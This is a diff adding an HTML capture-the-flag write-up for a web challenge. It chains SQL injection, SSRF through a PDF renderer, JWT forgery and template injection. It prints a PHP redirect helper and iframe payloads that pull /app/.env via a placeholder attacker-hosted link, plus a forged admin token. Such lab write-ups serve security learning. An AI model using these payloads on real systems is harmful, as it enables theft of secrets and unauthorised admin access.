@@ -1,0 +1,189 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="Web Blueprint Heist: an end-to-end application security writeup.">
+  <title>Web Blueprint Heist / Writeup</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="noise" aria-hidden="true"></div>
+  <div class="progress-track"><span id="reading-progress"></span></div>
+
+  <header class="masthead">
+    <a class="brand" href="#top" aria-label="Web Blueprint Heist home">
+      <span class="brand-mark">WB</span>
+      <span>Web Blueprint<br><strong>Heist</strong></span>
+    </a>
+    <div class="status"><span></span> Case file / complete</div>
+  </header>
+
+  <main id="top">
+    <section class="hero reveal">
+      <div class="hero-copy">
+        <p class="kicker">Application security / field notes</p>
+        <h1>A blueprint for<br><em>breaking the frame.</em></h1>
+        <p class="hero-lede">A chained exploit path from weak input validation to a forged admin identity, an internal GraphQL request, and a template-rendered flag.</p>
+        <div class="hero-meta">
+          <span><b>01</b> target</span>
+          <span><b>06</b> stages</span>
+          <span><b>01</b> flag</span>
+        </div>
+      </div>
+      <div class="hero-diagram" aria-label="Exploit chain diagram">
+        <div class="radar"><span></span><span></span><span></span></div>
+        <div class="diagram-node node-a">SQLi</div>
+        <div class="diagram-node node-b">SSRF</div>
+        <div class="diagram-node node-c">JWT</div>
+        <div class="diagram-node node-d">SSTI</div>
+        <svg viewBox="0 0 500 390" role="presentation" aria-hidden="true">
+          <path d="M110 95 C210 50 260 85 300 135 S380 190 400 110" />
+          <path d="M400 110 C450 190 370 265 300 235 S170 260 100 310" />
+          <path d="M100 310 C190 350 250 315 300 235" />
+        </svg>
+        <p class="diagram-label">follow the chain<br><span>↓</span></p>
+      </div>
+    </section>
+
+    <div class="layout">
+      <aside class="toc" aria-label="Table of contents">
+        <p class="toc-label">Contents</p>
+        <a href="#analysis" class="active">01 / First signals</a>
+        <a href="#token">02 / Guest JWT</a>
+        <a href="#renderer">03 / PDF renderer</a>
+        <a href="#env">04 / Live environment</a>
+        <a href="#admin">05 / Admin identity</a>
+        <a href="#internal">06 / Internal routes</a>
+        <a href="#flag">07 / The flag</a>
+      </aside>
+
+      <article class="writeup">
+        <section id="analysis" class="chapter reveal">
+          <div class="chapter-head"><span>01</span><p>First signals</p></div>
+          <h2>Two details kept<br><em>the spider sense awake.</em></h2>
+          <p>At the beginning of the code analysis, two details triggered my attention. The first was a possible SQL injection in the GraphQL schema. The application calls <code>detectSqli</code>, but a blacklist-style check is not sufficient protection when the input is later interpolated directly into SQL.</p>
+          <div class="code-card">
+            <div class="code-bar"><span>app/schemas/schema.js</span><button class="copy" data-copy="sql-code">copy</button></div>
+            <pre id="sql-code"><code>if (detectSqli(args.name)) {
+  return generateError(400, "Username must only contain letters, numbers, and spaces.");
+}
+
+data = await connection.query(
+  `SELECT * FROM users WHERE name like '%${args.name}%'`
+).then(rows =&gt; rows[0]);</code></pre>
+          </div>
+          <p>The second detail was the use of dynamic values in the EJS template engine. At this stage, SSTI was only a hypothesis for further research. The error template contains an EJS interpolation point:</p>
+          <div class="code-card">
+            <div class="code-bar"><span>app/views/errors/error.ejs</span><button class="copy" data-copy="ejs-code">copy</button></div>
+            <pre id="ejs-code"><code>&lt;div class="error-container site clear"&gt;
+  &lt;h1&gt;Error Occured&lt;/h1&gt;
+  &lt;p&gt;&lt;%= error %&gt;&lt;/p&gt;
+&lt;/div&gt;</code></pre>
+          </div>
+          <aside class="note"><span>Hypothesis</span> Because <code>&lt;%= ... %&gt;</code> is escaped output, this snippet alone does not prove SSTI. It was an initial lead while tracing how errors are created, passed to the renderer, and displayed.</aside>
+        </section>
+
+        <section id="token" class="chapter reveal">
+          <div class="chapter-head"><span>02</span><p>Identity</p></div>
+          <h2>Start with a<br><em>guest token.</em></h2>
+          <p>The public routes expose <code>/getToken</code>, which returns a JWT containing the guest role. The PDF endpoint is <code>POST /download</code> and expects that guest token in the <code>token</code> query parameter.</p>
+          <figure><img src="getandforge/burp.png" alt="Burp response showing the guest JWT"><figcaption>Figure 01 / Guest JWT response</figcaption></figure>
+          <p>The secret shown in the challenge source is not necessarily the active secret. The running application loads <code>process.env.secret</code> from the live environment, so the source value cannot be trusted for forging a valid token.</p>
+        </section>
+
+        <section id="renderer" class="chapter reveal">
+          <div class="chapter-head"><span>03</span><p>Surface area</p></div>
+          <h2>The PDF renderer<br><em>accepts a URL.</em></h2>
+          <p>The download controller accepts a URL from the request body and passes it directly to <code>wkhtmltopdf</code>:</p>
+          <div class="code-card"><div class="code-bar"><span>downloadController.js</span></div><pre><code>const { url } = req.body;
+
+if (!isUrl(url)) {
+  return next(generateError(400, "Invalid URL"));
+}
+
+const pdfPath = await generatePdf(url);</code></pre></div>
+          <p>The endpoint can therefore be tested with a URL hosted by us. The figures show that the application accepts external content and returns a generated PDF.</p>
+          <div class="figure-grid"><figure><img src="getenv/figure1.png" alt="PDF generation flow"><figcaption>Figure 02 / URL input</figcaption></figure><figure><img src="getenv/figure2.png" alt="Download endpoint request"><figcaption>Figure 03 / Download endpoint</figcaption></figure><figure class="wide"><img src="getenv/figure3.png" alt="External URL rendered as PDF"><figcaption>Figure 04 / External rendering confirmed</figcaption></figure></div>
+          <p>A direct <code>file:///app/.env</code> request raises an error in wkhtml, so an intermediate redirecting endpoint is needed.</p>
+        </section>
+
+        <section id="env" class="chapter reveal">
+          <div class="chapter-head"><span>04</span><p>Extraction</p></div>
+          <h2>Turn the renderer<br><em>toward the environment.</em></h2>
+          <p>Host a page that embeds a helper endpoint. Replace <code>ZROK_LINK</code> with the public URL of the helper:</p>
+          <div class="code-card"><div class="code-bar"><span>index.html</span><button class="copy" data-copy="env-code">copy</button></div><pre id="env-code"><code>&lt;iframe
+  src="https://ZROK_LINK/ssrf.php?x=/app/.env"
+  title="Environment request"
+  width="1000"
+  height="1000"&gt;
+&lt;/iframe&gt;</code></pre></div>
+          <p>The helper redirects to the requested local file:</p>
+          <div class="code-card"><div class="code-bar"><span>ssrf.php</span></div><pre><code>&lt;?php
+http_response_code(302);
+header('Location: file://' . $_GET['x']);
+exit;</code></pre></div>
+          <p>Submit the hosted page URL to <code>POST /download</code> with the guest token. wkhtmltopdf follows the redirect to <code>file:///app/.env</code> and includes the file contents in the generated PDF.</p>
+          <div class="figure-grid"><figure><img src="getenv/figure4.png" alt="Generated PDF request"><figcaption>Figure 05 / Generated PDF</figcaption></figure><figure><img src="getenv/figure5.png" alt="Recovered environment file"><figcaption>Figure 06 / Live environment recovered</figcaption></figure></div>
+        </section>
+
+        <section id="admin" class="chapter reveal">
+          <div class="chapter-head"><span>05</span><p>Privilege</p></div>
+          <h2>Promote the identity<br><em>to admin.</em></h2>
+          <p>Decode the guest token, change <code>role: "user"</code> to <code>role: "admin"</code>, and sign the payload with the secret recovered from <code>.env</code>.</p>
+          <div class="figure-grid"><figure><img src="forge2admin/figure1.png" alt="Decoded guest JWT"><figcaption>Figure 07 / Original user role</figcaption></figure><figure><img src="forge2admin/figure2.png" alt="Signed admin JWT"><figcaption>Figure 08 / Forged admin role</figcaption></figure></div>
+          <div class="token-box"><span>Forged token / HS256</span><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3ODg0NDEwNjR9.ql5gfjhQebI-mQ4ZRT4bbhmzbYuxo57tNfpMGDZ6epM</code></div>
+        </section>
+
+        <section id="internal" class="chapter reveal">
+          <div class="chapter-head"><span>06</span><p>Access control</p></div>
+          <h2>Admin is not enough.<br><em>Be internal.</em></h2>
+          <p>Both <code>/admin</code> and <code>/graphql</code> use <code>authMiddleware("admin")</code>. The middleware verifies the role and checks that the socket address is <code>127.0.0.1</code>.</p>
+          <div class="code-card"><div class="code-bar"><span>app/routes/internal.js</span></div><pre><code>router.get("/admin", authMiddleware("admin"), (req, res) =&gt; {
+  res.render("admin");
+});
+
+router.all("/graphql", authMiddleware("admin"), (req, res, next) =&gt; {
+  createHandler({ schema, context: { pool } })(req, res, next);
+});</code></pre></div>
+          <p>A direct request with a valid admin JWT returns <code>403 Only available for internal users!</code>.</p>
+          <figure><img src="forge2admin/figure4.png" alt="Direct GraphQL request rejected for non-internal users"><figcaption>Figure 09 / Loopback restriction</figcaption></figure>
+          <p>Reuse the PDF-renderer technique to make the request from inside the application environment:</p>
+          <div class="code-card"><div class="code-bar"><span>internal-http-test.html</span><button class="copy" data-copy="internal-code">copy</button></div><pre id="internal-code"><code>&lt;iframe
+  src="http://localhost:1337/graphql?query=%7BgetDataByName%28name%3A%20%22john%22%29%7BisPresent%2C%20name%7D%7D&amp;token=YOUR_ADMIN_JWT"
+  width="1000"
+  height="1000"&gt;
+&lt;/iframe&gt;</code></pre></div>
+          <p>The iframe request originates from the renderer inside the container, satisfying the loopback check. The forged JWT satisfies the admin-role check, and the GraphQL response is rendered into the resulting PDF.</p>
+        </section>
+
+        <section id="flag" class="chapter final reveal">
+          <div class="chapter-head"><span>07</span><p>Payload / result</p></div>
+          <h2>Chain the findings.<br><em>Open the door.</em></h2>
+          <p>The remaining question was how to combine the SQL injection and the template-engine hypothesis. The solution was a UNION-based SQL injection that creates a 404 template, followed by a request to an intentionally nonexistent page.</p>
+          <div class="chain"><span>GraphQL input</span><b>→</b><span>UNION</span><b>→</b><span>404.ejs</span><b>→</b><span>/readflag</span></div>
+          <p>The injected value is hex-encoded and written with MySQL <code>INTO DUMPFILE</code>. That functionality creates a new file but fails when the destination already exists, which is why the previously absent <code>404.ejs</code> path is used. The error controller then selects the 404 template when an invalid route is requested.</p>
+          <div class="code-card"><div class="code-bar"><span>errorController.js</span></div><pre><code>const errorTemplate = (err.status &gt;= 400 &amp;&amp; err.status &lt; 600)
+  ? err.status
+  : "error";
+let templatePath = path.join(templateDir, `${errorTemplate}.ejs`);
+
+if (!fs.existsSync(templatePath)) {
+  templatePath = path.join(templateDir, `error.ejs`);
+}
+
+res.render(templatePath, { error: err.message }, (renderErr, html) =&gt; {
+  res.send(html);
+});</code></pre></div>
+          <p>The UNION result supplies the template content, and the nonexistent-page request triggers its rendering. The injected EJS expression executes <code>/readflag</code>, returning the flag in the rendered response.</p>
+          <div class="flag"><span>Captured output</span><strong>HTB{ch41ning_m4st3rs_b4y0nd_1m4g1nary_01d7300c0466ff90808a90f7a30d2538}</strong></div>
+          <div class="result-grid"><div><b>01</b><span>Guest JWT</span></div><div><b>02</b><span>Live secret</span></div><div><b>03</b><span>Admin JWT</span></div><div><b>04</b><span>Internal GraphQL</span></div><div><b>05</b><span>Flag recovered</span></div></div>
+        </section>
+      </article>
+    </div>
+  </main>
+
+  <footer><span>WEB BLUEPRINT HEIST / FIELD NOTES</span><span>Static case file · <span id="year"></span></span></footer>
+  <script src="script.js"></script>
+</body>
+</html>
